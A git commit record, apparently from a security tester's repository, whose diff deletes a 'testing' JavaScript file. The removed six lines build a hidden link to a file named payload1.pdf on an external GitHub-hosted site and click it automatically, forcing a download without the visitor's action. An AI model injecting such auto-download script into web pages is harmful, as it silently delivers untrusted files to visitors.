6fddc5909af3776d512a50cf83a465633e63230f
aillesiM <29269177+ener1-s3c@users.noreply.github.com>
2024-08-25 13:54:36 +0700

    delete testing .js

--- l.js
+++
@@ -1,6 +0,0 @@
-var link = document.createElement("a");
-link.href = "https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/payload1.pdf";
-link.download = "payload1.pdf";
-document.body.appendChild(link);
-link.click();
-document.body.removeChild(link);
